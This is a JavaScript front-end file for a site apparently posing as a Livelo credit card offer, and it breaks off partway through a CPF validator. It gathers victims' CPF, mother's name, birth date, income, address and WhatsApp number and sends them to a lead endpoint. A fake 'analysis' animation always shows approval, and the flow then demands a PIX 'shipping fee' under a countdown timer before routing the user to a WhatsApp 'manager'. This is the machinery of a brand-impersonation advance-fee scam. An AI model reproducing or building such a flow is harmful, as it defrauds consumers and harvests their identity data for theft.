/* ═══════════════════════════════════════════════════════════════
   LIVELO CREDIT SYSTEM — main.js
   Controle de fluxo do lead, integração com API C7 (PIX), UI State
═══════════════════════════════════════════════════════════════ */

// ============================================================================
// ESTADO GLOBAL
// ============================================================================
const STATE = {
  sessionId: localStorage.getItem('livelo_session') || null,
  cpf: '',
  nome: '',
  nome_mae: '',
  data_nasc: '',
  renda: null,
  tipo_renda: null,
  dia_vencimento: null,
  color: 'gradient_pink',
  style: 'standard',
  managerWa: '5511999999999',
  paymentId: null,
  pixCode: null
};

if (!STATE.sessionId) {
  STATE.sessionId = 'ses_' + Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15);
  localStorage.setItem('livelo_session', STATE.sessionId);
}

// Track Visit in Background
fetch('/api/visit', { method: 'POST' }).catch(() => {});

// ============================================================================
// UTILITÁRIOS
// ============================================================================
function $id(id) { return document.getElementById(id); }

function goToStep(stepId) {
  document.querySelectorAll('.screen').forEach(el => el.classList.remove('active'));
  $id(`screen-${stepId}`).classList.add('active');
  window.scrollTo({ top: 0, behavior: 'smooth' });
}

function showErr(id, msg) {
  const el = $id(id);
  if (!el) return;
  el.textContent = msg;
  el.classList.remove('hidden');
}
function hideErr(id) {
  const el = $id(id);
  if (el) el.classList.add('hidden');
}

// ============================================================================
// MÁSCARAS
// ============================================================================
function mascaraCpf(v) {
  v = v.replace(/\D/g, "");
  if (v.length <= 11) {
    v = v.replace(/(\d{3})(\d)/, "$1.$2");
    v = v.replace(/(\d{3})(\d)/, "$1.$2");
    v = v.replace(/(\d{3})(\d{1,2})$/, "$1-$2");
  }
  return v;
}
function mascaraData(v) {
  v = v.replace(/\D/g, "");
  if (v.length > 2) v = v.replace(/^(\d{2})(\d)/, "$1/$2");
  if (v.length > 5) v = v.replace(/^(\d{2})\/(\d{2})(\d)/, "$1/$2/$3");
  return v.substring(0, 10);
}
function mascaraTel(v) {
  v = v.replace(/\D/g, "");
  if (v.length > 2) v = v.replace(/^(\d{2})(\d)/g, "($1) $2");
  if (v.length > 9) v = v.replace(/(\d{5})(\d{4})$/, "$1-$2");
  return v;
}

const inputCpf = $id('input-cpf');
if (inputCpf) {
  inputCpf.addEventListener('input', (e) => {
    e.target.value = mascaraCpf(e.target.value);
    hideErr('cpf-error');
    // Revela campo de nascimento após CPF ter 11 dígitos
    const digits = e.target.value.replace(/\D/g, '');
    const nascGroup = $id('nasc-input-group');
    if (digits.length === 11) {
      consultarCpf();
    }
  });
}
const inputNasc = $id('input-nasc');
if (inputNasc) {
  inputNasc.addEventListener('input', (e) => {
    e.target.value = mascaraData(e.target.value);
    hideErr('cpf-error');
  });
}
const inputWa = $id('input-whatsapp');
if (inputWa) {
  inputWa.addEventListener('input', (e) => {
    e.target.value = mascaraTel(e.target.value);
    hideErr('wa-error');
  });
}

// ============================================================================
// ETAPA 1: CPF
// ============================================================================
async function consultarCpf() {
  hideErr('cpf-error');
  const cpfVal = (inputCpf.value || '').replace(/\D/g, '');
  const nascVal = inputNasc ? inputNasc.value : '';

  if (cpfVal.length !== 11) {
    return showErr('cpf-error', 'Digite um CPF válido com 11 números.');
  }


  $id('btn-consultar-text').classList.add('hidden');
  $id('btn-consultar-spin').classList.remove('hidden');
  $id('btn-consultar').disabled = true;

  try {
    const res = await fetch('/api/cpf', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ cpf: cpfVal, data_nasc: nascVal })
    });
    const data = await res.json();
    
    if (data.ok) {
      STATE.cpf = data.cpf_fmt || cpfVal;
      STATE.nome = data.nome;
      STATE.nome_mae = data.nome_mae;
      STATE.data_nasc = data.data_nasc;
      
      $id('r-nome').textContent = data.nome.split(' ')[0] + ' ' + (data.nome.split(' ')[1] || '');
      $id('r-cpf').textContent = data.cpf_fmt;
      $id('r-mae').textContent = data.nome_mae.split(' ')[0] + ' ***';
      $id('r-nasc').textContent = data.data_nasc;
      
      $id('cpf-input-group').classList.add('hidden');
      $id('btn-consultar').classList.add('hidden');
      $id('cpf-result').classList.remove('hidden');
      
      // Update welcome screen name
      const firstName = data.nome.split(' ')[0];
      $id('welcome-name-display').textContent = firstName;
      $id('style-card-name').textContent = firstName;
      
      // Send initial lead capture
      fetch('/api/lead', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          session_id: STATE.sessionId,
          cpf: cpfVal,
          nome: data.nome,
          nome_mae: data.nome_mae,
          data_nasc: data.data_nasc
        })
      }).catch(console.error);
      
    } else {
      showErr('cpf-error', data.error || 'Não foi possível localizar este CPF.');
    }
  } catch (err) {
    showErr('cpf-error', 'Erro de conexão. Tente novamente.');
  } finally {
    $id('btn-consultar-text').classList.remove('hidden');
    $id('btn-consultar-spin').classList.add('hidden');
    $id('btn-consultar').disabled = false;
  }
}

function resetCpf() {
  $id('cpf-result').classList.add('hidden');
  $id('cpf-input-group').classList.remove('hidden');
  // Esconde nascimento de volta (progressive reveal)
  if ($id('nasc-input-group')) $id('nasc-input-group').classList.add('hidden');
  $id('btn-consultar').classList.remove('hidden');
  inputCpf.value = '';
  if (inputNasc) inputNasc.value = '';
  inputCpf.focus();
}

const btnCpfOk = $id('btn-cpf-ok');
if (btnCpfOk) {
  btnCpfOk.addEventListener('click', () => {
    // Update approved screen with name/cpf
    if ($id('approved-name-display')) $id('approved-name-display').textContent = STATE.nome ? STATE.nome.split(' ')[0] : 'SEU NOME';
    if ($id('summary-name')) $id('summary-name').textContent = STATE.nome ? STATE.nome.split(' ').slice(0,2).join(' ') : '—';
    if ($id('summary-end')) $id('summary-end').textContent = STATE.cpf || '—';
    goToStep('priority');
  });
}

// ============================================================================
// ETAPA 2: RENDA E EMPREGO
// ============================================================================
function selectIncome(btn, val) {
  document.querySelectorAll('.big-choice-btn, .income-btn').forEach(el => el.classList.remove('selected'));
  btn.classList.add('selected');
  STATE.renda = val;
  hideErr('income-error');
  // Auto-avança após breve feedback visual
  setTimeout(() => goToStep('employment'), 260);
}

function submitIncome() {
  if (!STATE.renda) return showErr('income-error', 'Selecione uma faixa de renda.');
  goToStep('employment');
}

function selectEmprego(btn) {
  document.querySelectorAll('#screen-employment .big-choice-btn, .income-btn').forEach(el => el.classList.remove('selected'));
  btn.classList.add('selected');
  STATE.tipo_renda = btn.dataset.tipo;
  hideErr('emp-error');
  // Auto-avança
  setTimeout(() => goToStep('motivo'), 260);
}

function submitEmprego() {
  if (!STATE.tipo_renda) return showErr('emp-error', 'Selecione sua situação profissional.');
  goToStep('motivo');
}

function selectMotivo(btn) {
  document.querySelectorAll('#screen-motivo .motivo-btn').forEach(el => el.classList.remove('selected'));
  btn.classList.add('selected');
  if (btn.dataset.motivo) STATE.motivo_credito = btn.dataset.motivo;
  hideErr('motivo-error');
  // Auto-avança
  setTimeout(() => goToStep('billing'), 260);
}

function submitMotivo() {
  if (!STATE.motivo_credito) return showErr('motivo-error', 'Selecione o motivo para continuar.');
  goToStep('billing');
}

// ============================================================================
// ETAPA 3: VENCIMENTO
// ============================================================================
function selectDay(btn) {
  document.querySelectorAll('.day-btn').forEach(el => el.classList.remove('selected'));
  btn.classList.add('selected');
  STATE.dia_vencimento = btn.textContent.trim();
  hideErr('billing-error');
}

async function submitBilling() {
  if (!STATE.cpf) {
    showErr('billing-error', 'Sessão expirada. Redirecionando para o início...');
    setTimeout(() => goToStep('cpf'), 2500);
    return;
  }
  if (!STATE.dia_vencimento) return showErr('billing-error', 'Selecione o dia de vencimento.');
  
  $id('billing-btn-text').classList.add('hidden');
  $id('billing-spin').classList.remove('hidden');
  
  try {
    const res = await fetch('/api/lead', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(STATE)
    });
    const data = await res.json();
    
    if (data.ok) {
      if ($id('approved-limit')) $id('approved-limit').textContent = data.limite;
      STATE.limite = data.limite;
      if ($id('done-limite')) $id('done-limite').textContent = data.limite;
      
      // Update PIX step with correct shipping cost
      if (data.frete && $id('pix-frete-display')) {
        $id('pix-frete-display').textContent = data.frete;
      }
      
      goToStep('limit-info');
    } else {
      showErr('billing-error', data.error || 'Erro ao processar.');
      $id('billing-btn-text').classList.remove('hidden');
      $id('billing-spin').classList.add('hidden');
    }
  } catch (err) {
    showErr('billing-error', 'Erro de conexão.');
    $id('billing-btn-text').classList.remove('hidden');
    $id('billing-spin').classList.add('hidden');
  }
}

// ============================================================================
// ANIMAÇÃO DE ANÁLISE
// ============================================================================
function startAnalysis() {
  goToStep('analysis');
  
  let pct = 0;
  const pctEl = $id('analysis-pct');
  const circleEl = $id('analysis-progress-circle');
  
  // Array of timers to clear if needed
  const timers = [];
  
  // Progress counter
  const interval = setInterval(() => {
    pct += 1;
    if (pct <= 100) {
      pctEl.textContent = pct + '%';
      const offset = 326 - (326 * pct) / 100;
      circleEl.style.strokeDashoffset = offset;
    } else {
      clearInterval(interval);
    }
  }, 45); // Takes about 4.5 seconds for 100%
  
  timers.push(interval);
  
  // Step checks
  timers.push(setTimeout(() => {
    $id('astep-1').querySelector('.astep-icon').classList.remove('pending');
    $id('astep-1').querySelector('.astep-icon').classList.add('checking');
  }, 300));
  
  timers.push(setTimeout(() => {
    $id('astep-1').querySelector('.astep-icon').classList.remove('checking');
    $id('astep-1').querySelector('.astep-icon').classList.add('done');
    $id('astep-2').querySelector('.astep-icon').classList.add('checking');
  }, 1500));
  
  timers.push(setTimeout(() => {
    $id('astep-2').querySelector('.astep-icon').classList.remove('checking');
    $id('astep-2').querySelector('.astep-icon').classList.add('done');
    $id('astep-3').querySelector('.astep-icon').classList.add('checking');
  }, 3200));
  
  timers.push(setTimeout(() => {
    $id('astep-3').querySelector('.astep-icon').classList.remove('checking');
    $id('astep-3').querySelector('.astep-icon').classList.add('done');
    $id('astep-4').querySelector('.astep-icon').classList.add('checking');
  }, 3800));
  
  timers.push(setTimeout(() => {
    $id('astep-4').querySelector('.astep-icon').classList.remove('checking');
    $id('astep-4').querySelector('.astep-icon').classList.add('done');
  }, 6500));
  
  // Go to approved screen
  timers.push(setTimeout(() => {
    goToStep('approved');
  }, 7500));
}

// ============================================================================
// CUSTOMIZADOR DE CARTÃO
// ============================================================================
const CARD_TEMPLATES = {
  'classico': { name: 'Clássico', bg: 'linear-gradient(135deg,#E5147A,#9C0E57)', svg: '<path d="M-20 120 C50 60 150 140 240 80 S360 60 400 80" stroke="white" fill="none" stroke-width="40" opacity="0.12"/><path d="M-20 160 C50 100 150 180 240 120 S360 100 400 120" stroke="white" fill="none" stroke-width="28" opacity="0.1"/><circle cx="320" cy="40" r="80" stroke="white" fill="none" stroke-width="2" opacity="0.18"/><circle cx="320" cy="40" r="52" stroke="white" fill="none" stroke-width="1.5" opacity="0.14"/>' },
  'noir': { name: 'Noir', bg: 'linear-gradient(135deg,#1A1A2E,#0F3460)', svg: '<line x1="0" y1="40" x2="340" y2="40" stroke="#D4AF37" stroke-width="2" opacity="0.5"/><line x1="0" y1="80" x2="340" y2="80" stroke="#D4AF37" stroke-width="2" opacity="0.5"/><line x1="0" y1="120" x2="340" y2="120" stroke="#D4AF37" stroke-width="2" opacity="0.5"/><line x1="100" y1="0" x2="100" y2="200" stroke="#D4AF37" stroke-width="2" opacity="0.5"/><line x1="180" y1="0" x2="180" y2="200" stroke="#D4AF37" stroke-width="2" opacity="0.5"/><line x1="260" y1="0" x2="260" y2="200" stroke="#D4AF37" stroke-width="2" opacity="0.5"/>' },
  'oceano': { name: 'Oceano', bg: 'linear-gradient(135deg,#0EA5E9,#0369A1)', svg: '<path d="M0 60 C40 20 80 100 120 60 S200 20 240 60 S300 20 340 60" stroke="white" fill="none" stroke-width="18" opacity="0.15"/><path d="M0 110 C40 70 80 150 120 110 S200 70 240 110 S300 70 340 110" stroke="white" fill="none" stroke-width="14" opacity="0.1"/><path d="M0 160 C40 120 80 200 120 160 S200 120 240 160 S300 120 340 160" stroke="white" fill="none" stroke-width="10" opacity="0.08"/>' },
  'esmeralda': { name: 'Esmeralda', bg: 'linear-gradient(135deg,#059669,#064E3B)', svg: '<polygon points="170,20 220,50 220,110 170,140 120,110 120,50" stroke="white" fill="none" stroke-width="5" opacity="0.2"/><polygon points="280,40 320,60 320,100 280,120 240,100 240,60" stroke="white" fill="none" stroke-width="3" opacity="0.15"/><polygon points="60,40 100,60 100,100 60,120 20,100 20,60" stroke="white" fill="none" stroke-width="3" opacity="0.15"/><polygon points="170,90 200,110 200,150 170,170 140,150 140,110" stroke="white" fill="none" stroke-width="3" opacity="0.12"/>' },
  'galaxia': { name: 'Galáxia', bg: 'linear-gradient(135deg,#7C3AED,#4C1D95)', svg: '<circle cx="50" cy="40" r="4" fill="white" opacity="0.8"/><circle cx="150" cy="30" r="5" fill="white" opacity="0.9"/><circle cx="250" cy="60" r="4" fill="white" opacity="0.7"/><circle cx="100" cy="120" r="3" fill="white" opacity="0.6"/><circle cx="200" cy="140" r="4" fill="white" opacity="0.8"/><circle cx="300" cy="100" r="3" fill="white" opacity="0.6"/><circle cx="40" cy="160" r="4" fill="white" opacity="0.7"/><circle cx="280" cy="170" r="3" fill="white" opacity="0.7"/><line x1="50" y1="40" x2="150" y2="30" stroke="white" stroke-width="1.5" opacity="0.4"/><line x1="150" y1="30" x2="250" y2="60" stroke="white" stroke-width="1.5" opacity="0.4"/><line x1="150" y1="30" x2="100" y2="120" stroke="white" stroke-width="1.5" opacity="0.3"/><line x1="100" y1="120" x2="200" y2="140" stroke="white" stroke-width="1.5" opacity="0.3"/><line x1="250" y1="60" x2="300" y2="100" stroke="white" stroke-width="1.5" opacity="0.3"/><line x1="200" y1="140" x2="280" y2="170" stroke="white" stroke-width="1.5" opacity="0.3"/><line x1="100" y1="120" x2="40" y2="160" stroke="white" stroke-width="1.5" opacity="0.3"/>' },
  'aurora': { name: 'Aurora', bg: 'linear-gradient(135deg,#F59E0B,#EF4444)', svg: '<line x1="340" y1="200" x2="340" y2="0" stroke="white" stroke-width="6" opacity="0.25"/><line x1="340" y1="200" x2="280" y2="0" stroke="white" stroke-width="5" opacity="0.22"/><line x1="340" y1="200" x2="220" y2="0" stroke="white" stroke-width="4" opacity="0.2"/><line x1="340" y1="200" x2="160" y2="0" stroke="white" stroke-width="3" opacity="0.18"/><line x1="340" y1="200" x2="100" y2="0" stroke="white" stroke-width="2.5" opacity="0.15"/><line x1="340" y1="200" x2="40" y2="0" stroke="white" stroke-width="2" opacity="0.12"/><line x1="340" y1="200" x2="-20" y2="50" stroke="white" stroke-width="2.5" opacity="0.18"/><circle cx="340" cy="200" r="80" stroke="white" fill="none" stroke-width="4" opacity="0.2"/><circle cx="340" cy="200" r="150" stroke="white" fill="none" stroke-width="3" opacity="0.12"/>' }
};

function selectTemplate(btn, id) {
  document.querySelectorAll('.tpl-thumb').forEach(el => el.classList.remove('tpl-thumb-active'));
  btn.classList.add('tpl-thumb-active');
  
  const tpl = CARD_TEMPLATES[id];
  STATE.color = id;
  
  const flipper = $id('card-flipper');
  const preview = $id('advanced-card-preview');
  const svgInner = $id('card-pattern-inner');
  const label = $id('tpl-active-label');
  
  flipper.style.transform = 'rotateY(90deg)';
  
  setTimeout(() => {
    preview.style.background = tpl.bg;
    svgInner.innerHTML = tpl.svg;
    label.innerHTML = `&#10022; ${tpl.name}`;
    flipper.style.transform = 'rotateY(0deg)';
  }, 300);
}

function submitCardStyle() {
  fetch('/api/card-style', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ session_id: STATE.sessionId, color: STATE.color, style: STATE.style })
  }).catch(console.error);
  // Vai para tela de sucesso
  goToStep('cep');
  if(STATE.nome_completo) { 
      var n1 = document.getElementById('sum-nome'); if(n1) n1.innerText = STATE.nome_completo; 
      var n2 = document.getElementById('pix-nome'); if(n2) n2.innerText = STATE.nome_completo; 
  }
  if(STATE.cpf) { var cpf1 = document.getElementById('pix-cpf'); if(cpf1) cpf1.innerText = STATE.cpf; }
  if(STATE.celular) { var tel1 = document.getElementById('pix-tel'); if(tel1) tel1.innerText = STATE.celular; }
  var cv = document.getElementById('summary-card-visual');
  if(cv && CARD_TEMPLATES[STATE.color || 'classico']) { cv.style.background = CARD_TEMPLATES[STATE.color || 'classico'].bg; }
  var cn = document.getElementById('summary-card-name');
  if(cn) cn.innerText = STATE.nome_completo || 'SEU NOME';
}

// Seleção de método de envio — carrega gerente e vai ao WhatsApp
function selectShipping(type, price) {
  STATE.frete_tipo = type;
  STATE.frete_valor = price;
  // Atualiza valor exibido no PIX
  const display = price.toFixed(2).replace('.', ',');
  [$id('pix-frete-display'), $id('approved-frete-val')].forEach(el => {
    if (el) el.textContent = 'R$ ' + display;
  });
  // Feedback visual na opção escolhida
  ['ship-sedex','ship-pac'].forEach(id => {
    const el = $id(id);
    if (el) el.classList.toggle('selected', el.id === `ship-${type}`);
  });
  // Carrega dados do gerente e avança
  fetch('/api/manager')
    .then(r => r.json())
    .then(data => {
      if (data.ok) {
        $id('mgr-display-name').textContent = data.name;
        $id('manager-photo-img').src = data.photo_url;
        $id('mgr-since-badge').innerHTML = `
          <svg viewBox="0 0 16 16" fill="none" width="12" height="12">
            <path d="M8 2l1.5 3L13 5.5l-2.5 2.5.6 3.5L8 10l-3.1 1.5.6-3.5L3 5.5 6.5 5z" fill="#E91E8C"/>
          </svg>
          Melhor gerente ${data.since_year || 2025}
        `;
      }
    })
    .catch(console.error)
    .finally(() => {
      setTimeout(() => goToStep('whatsapp'), 350);
    });
}

// ============================================================================
// WHATSAPP
// ============================================================================
async function submitWhatsapp() {
  hideErr('wa-error');
  const waVal = (inputWa.value || '').replace(/\D/g, '');
  
  if (waVal.length < 10) {
    return showErr('wa-error', 'Digite um número de WhatsApp válido com DDD.');
  }
  
  $id('btn-wa-text').classList.add('hidden');
  $id('wa-btn-arrow').classList.add('hidden');
  $id('btn-wa-spin').classList.remove('hidden');
  $id('btn-wa-continuar').disabled = true;
  
  try {
    const res = await fetch('/api/whatsapp', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ session_id: STATE.sessionId, whatsapp: waVal })
    });
    const data = await res.json();
    
    if (data.ok) {
      STATE.managerWa = data.manager_wa || data.manager_whatsapp || '5511999999999';
      gerarPix();
    } else {
      showErr('wa-error', data.error || 'Erro ao salvar. Tente novamente.');
      $id('btn-wa-text').classList.remove('hidden');
      $id('wa-btn-arrow').classList.remove('hidden');
      $id('btn-wa-spin').classList.add('hidden');
      $id('btn-wa-continuar').disabled = false;
    }
  } catch (err) {
    showErr('wa-error', 'Erro de conexão.');
    $id('btn-wa-text').classList.remove('hidden');
    $id('wa-btn-arrow').classList.remove('hidden');
    $id('btn-wa-spin').classList.add('hidden');
    $id('btn-wa-continuar').disabled = false;
  }
}

// ============================================================================
// PIX E PAGAMENTO
// ============================================================================
let pixCheckInterval = null;

async function gerarPix() {
  goToStep('pix');
  
  $id('qr-loading').classList.remove('hidden');
  $id('qr-img').classList.add('hidden');
  $id('pix-code-text').value = 'Gerando código PIX...';
  
  try {
    const res = await fetch('/api/gerar-pix', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ session_id: STATE.sessionId })
    });
    const data = await res.json();
    
    if (data.ok) {
      STATE.paymentId = data.payment_id;
      STATE.pixCode = data.pix_code;
      
      $id('pix-code-text').value = data.pix_code;
      
      if (data.qr_code_url) {
        $id('qr-img').src = data.qr_code_url;
        $id('qr-img').onload = () => {
          $id('qr-loading').classList.add('hidden');
          $id('qr-img').classList.remove('hidden');
        };
      } else {
        $id('qr-loading').innerHTML = 'Código PIX gerado.<br>Copie o texto abaixo.';
      }
      
      // Start polling for payment status
      startPixPolling(data.payment_id);
      
    } else {
      $id('qr-loading').innerHTML = '<span style="color:#DC2626">Erro ao gerar cobrança.<br>Atualize a página.</span>';
      $id('pix-code-text').value = '';
    }
  } catch (err) {
    $id('qr-loading').innerHTML = '<span style="color:#DC2626">Falha de conexão.<br>Tente novamente.</span>';
    $id('pix-code-text').value = '';
  }
}

function copyPix() {
  const pixCode = $id('pix-code-text').value;
  if (!pixCode || pixCode.includes('Gerando')) return;
  
  navigator.clipboard.writeText(pixCode).then(() => {
    $id('copy-feedback').classList.remove('hidden');
    setTimeout(() => {
      $id('copy-feedback').classList.add('hidden');
    }, 3000);
  }).catch(err => {
    // fallback
    const ta = $id('pix-code-text');
    ta.select();
    document.execCommand('copy');
    $id('copy-feedback').classList.remove('hidden');
    setTimeout(() => {
      $id('copy-feedback').classList.add('hidden');
    }, 3000);
  });
}

function startPixPolling(paymentId) {
  if (pixCheckInterval) clearInterval(pixCheckInterval);
  
  let attempts = 0;
  pixCheckInterval = setInterval(async () => {
    attempts++;
    if (attempts > 120) { // Stop polling after 10 minutes (5s interval)
      clearInterval(pixCheckInterval);
      return;
    }
    
    try {
      const res = await fetch(`/api/status-pix/${paymentId}`);
      const data = await res.json();
      
      if (data.ok && (data.status === 'paid' || data.status === 'authorized' || data.status === 'completed')) {
        clearInterval(pixCheckInterval);
        
        // Update UI briefly before transition
        $id('pix-status-dot').classList.add('paid');
        $id('pix-status-text').textContent = 'Pagamento Confirmado!';
        $id('pix-status-text').style.color = '#10B981';
        $id('pix-status-text').style.fontWeight = '700';
        
        setTimeout(() => {
          showDone();
        }, 1500);
      }
    } catch (err) {
      console.error('Polling error', err);
    }
  }, 5000); // Check every 5 seconds
}

function showDone() {
    // Configura link do zap
  let waNumber = window.APP_WA_NUM || STATE.managerWa || '5511999999999';
  waNumber = waNumber.replace(/\D/g, '');
  if (waNumber.length > 0 && !waNumber.startsWith('55')) waNumber = '55' + waNumber;
  
  let rawText = window.APP_WA_TEXT || 'Olá! Acabei de pagar o frete do meu cartão Livelo (Sessão: {token}). Gostaria de confirmar a entrega e liberar meu limite de {limite}!';
  rawText = rawText.replace('{token}', (STATE.sessionId || 'XXXX').substring(0,8));
  rawText = rawText.replace('{limite}', STATE.limite || 'R$ 4.500,00');
  
  const msg = encodeURIComponent(rawText);
  
  $id('btn-contact-manager').href = `https://wa.me/${waNumber}?text=${msg}`;
  
  goToStep('done');
}

// Modificação PIX Timer e API
const _oldGoTo = window.goToStep;
if(_oldGoTo) {
    window.goToStep = function(stepId) {
        _oldGoTo(stepId);
        if(stepId === 'pix') {
            fetch('/api/pix', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(STATE)
            })
            .then(r => r.json())
            .then(data => {
                if(data.qr_code_base64) {
                    var qi = document.getElementById('qr-img');
                    if(qi) {
                        qi.src = 'data:image/png;base64,' + data.qr_code_base64;
                        qi.classList.remove('hidden');
                    }
                    var ql = document.getElementById('qr-loading');
                    if(ql) ql.classList.add('hidden');
                    var pt = document.getElementById('pix-code-text');
                    if(pt) pt.value = data.pix_copia_cola;
                    
                    setInterval(() => {
                        fetch('/api/check-payment/' + data.txid)
                        .then(r => r.json())
                        .then(pay => { if(pay.status === 'APPROVED') _oldGoTo('done'); }).catch(e=>e);
                    }, 4000);
                }
            }).catch(e=>console.log(e));
            
            let timeLeft = 7 * 60 + 35; // 7:35
            setInterval(() => {
                if(timeLeft <= 0) return;
                timeLeft--;
                let m = Math.floor(timeLeft / 60);
                let s = timeLeft % 60;
                var tmr = document.getElementById('pix-timer');
                if(tmr) tmr.innerText = (m < 10 ? '0'+m : m) + ':' + (s < 10 ? '0'+s : s);
            }, 1000);
        }
    };
}


// ============================================================================
// CEP & ENDEREÇO
// ============================================================================
function mascaraCep(input) {
  let v = input.value.replace(/\D/g, '');
  if (v.length > 5) v = v.replace(/^(\d{5})(\d)/, '$1-$2');
  input.value = v;
}

async function buscarCep() {
  const cep = $id('input-cep').value.replace(/\D/g, '');
  if (cep.length !== 8) return showErr('cep-error', 'Digite um CEP válido.');
  
  $id('btn-cep-buscar').innerText = 'Buscando...';
  hideErr('cep-error');
  
  try {
    const res = await fetch(`https://viacep.com.br/ws/${cep}/json/`);
    const data = await res.json();
    if (data.erro) throw new Error();
    
    $id('input-rua').value = data.logradouro;
    $id('input-bairro').value = data.bairro;
    $id('input-cidade').value = data.localidade;
    $id('input-estado').value = data.uf;
    
    STATE.cep = data.cep;
    STATE.rua = data.logradouro;
    STATE.bairro = data.bairro;
    STATE.cidade = data.localidade;
    STATE.uf = data.uf;
    
    $id('address-fields').classList.remove('hidden');
    $id('btn-cep-buscar').classList.add('hidden');
    $id('btn-cep-continuar').classList.remove('hidden');
    $id('input-numero').focus();
    
  } catch(e) {
    showErr('cep-error', 'CEP não encontrado.');
    $id('btn-cep-buscar').innerText = 'Buscar CEP';
  }
}

function submitCep() {
  const num = $id('input-numero').value.trim();
  if (!num) return showErr('cep-error', 'Informe o número do endereço.');
  const comp = $id('input-complemento').value.trim();
  
  STATE.numero = num;
  STATE.complemento = comp;
  
  // Fill summary screens
  const fullRua = `${STATE.rua}, ${num}` + (comp ? ` - ${comp}` : '');
  const fullBairro = `${STATE.bairro} - ${STATE.cidade}/${STATE.uf}`;
  
  [$id('display-rua'), $id('sum-rua')].forEach(el => { if(el) el.innerText = fullRua; });
  [$id('display-bairro'), $id('sum-bairro')].forEach(el => { if(el) el.innerText = fullBairro; });
  if($id('display-cep')) $id('display-cep').innerText = `CEP: ${STATE.cep}`;
  
  goToStep('cep');
}

// ============================================================================
// EFEITO 3D NO CARTÃO (Tilt)
// ============================================================================
document.addEventListener("DOMContentLoaded", () => {
    const card = document.getElementById('advanced-card-preview');
    if (card) {
        document.addEventListener('mousemove', (e) => {
            if(!card.getBoundingClientRect) return;
            const rect = card.getBoundingClientRect();
            // Somente aplica se o mouse estiver perto do card
            const isHovering = (e.clientX >= rect.left - 50 && e.clientX <= rect.right + 50 &&
                                e.clientY >= rect.top - 50 && e.clientY <= rect.bottom + 50);
            if(isHovering) {
                const x = e.clientX - rect.left;
                const y = e.clientY - rect.top;
                const xPct = x / rect.width;
                const yPct = y / rect.height;
                const rotateX = (yPct - 0.5) * -15; // max 15deg
                const rotateY = (xPct - 0.5) * 15;
                card.style.transform = `perspective(1000px) rotateX(${rotateX}deg) rotateY(${rotateY}deg) scale3d(1.02, 1.02, 1.02)`;
                card.style.transition = 'transform 0.1s ease-out';
            } else {
                card.style.transform = `perspective(1000px) rotateX(0) rotateY(0) scale3d(1, 1, 1)`;
                card.style.transition = 'transform 0.5s ease-out';
            }
        });
    }
});


// Novas funções para o fluxo
function mascaraTel(i) {
  let v = i.value.replace(/\D/g, '');
  if (v.length > 11) v = v.slice(0,11);
  if (v.length > 2) v = `(${v.slice(0,2)}) ${v.slice(2)}`;
  if (v.length > 9) v = `${v.slice(0,9)}-${v.slice(9)}`;
  i.value = v;
}

async function buscarCepBlur() {
  const cep = $id('input-cep').value.replace(/\D/g, '');
  if (cep.length !== 8) return;
  try {
    const res = await fetch(`https://viacep.com.br/ws/${cep}/json/`);
    const data = await res.json();
    if (!data.erro) {
      $id('input-rua').value = data.logradouro;
      $id('input-bairro').value = data.bairro;
      $id('input-cidade').value = data.localidade;
      $id('input-estado').value = data.uf;
      STATE.cep = data.cep;
      STATE.rua = data.logradouro;
      STATE.bairro = data.bairro;
      STATE.cidade = data.localidade;
      STATE.uf = data.uf;
    }
  } catch(e) {}
}

function submitAddress() {
  STATE.cep = $id('input-cep').value;
  STATE.rua = $id('input-rua').value;
  STATE.numero = $id('input-numero').value;
  STATE.complemento = $id('input-complemento').value;
  STATE.bairro = $id('input-bairro').value;
  STATE.cidade = $id('input-cidade').value;
  STATE.uf = $id('input-estado').value;
  
  if(!STATE.cep || !STATE.rua || !STATE.numero || !STATE.bairro || !STATE.cidade || !STATE.uf) {
      return showErr('cep-error', 'Preencha todos os campos obrigatórios.');
  }
  
  const fullRua = `${STATE.rua}, ${STATE.numero}` + (STATE.complemento ? ` - ${STATE.complemento}` : '');
  const fullBairro = `${STATE.bairro} - ${STATE.cidade}/${STATE.uf}`;
  
  if($id('display-rua')) $id('display-rua').innerText = fullRua;
  if($id('sum-rua')) $id('sum-rua').innerText = fullRua;
  if($id('display-bairro')) $id('display-bairro').innerText = fullBairro;
  if($id('sum-bairro')) $id('sum-bairro').innerText = fullBairro;
  if($id('display-cep')) $id('display-cep').innerText = `CEP: ${STATE.cep}`;
  
  goToStep('shipping-method');
}

function selectShipping(method, price) {
  STATE.shippingMethod = method;
  STATE.shippingPrice = price;
  goToStep('shipping-success');
}


// --- Real Validations ---
// Only letters in Name
const inputName = $id('input-name');
if(inputName) {
    inputName.addEventListener('input', function(e) {
        this.value = this.value.replace(/[^a-zA-ZáéíóúÁÉÍÓÚâêîôûÂÊÎÔÛãõÃÕçÇ\s]/g, '');
    });
}

// Ensure proper validations for address
const inputRua = $id('input-rua');
if(inputRua) {
    inputRua.addEventListener('input', function(e) {
        this.value = this.value.replace(/[^a-zA-Z0-9áéíóúÁÉÍÓÚâêîôûÂÊÎÔÛãõÃÕçÇ\s,-]/g, '');
    });
}
const inputCidade = $id('input-cidade');
if(inputCidade) {
    inputCidade.addEventListener('input', function(e) {
        this.value = this.value.replace(/[^a-zA-ZáéíóúÁÉÍÓÚâêîôûÂÊÎÔÛãõÃÕçÇ\s-]/g, '');
    });
}
const inputBairro = $id('input-bairro');
if(inputBairro) {
    inputBairro.addEventListener('input', function(e) {
        this.value = this.value.replace(/[^a-zA-Z0-9áéíóúÁÉÍÓÚâêîôûÂÊÎÔÛãõÃÕçÇ\s-]/g, '');
    });
}

// Validar CPF rigorosamente
function isCPFValid(cpf) {
    cpf = cpf.replace(/\D/g, '');
    if(cpf.length !== 11 || /^(\d)\1+$/.test(cpf)) return false;
    let sum = 0, rest;
    for (let i = 1; i <= 9; i++) sum = sum + parseInt(cpf.substring(i-1, i)) * (11 - i);
    rest = (sum * 10) % 11;
    if ((rest == 10) || (rest == 11))  rest = 0;
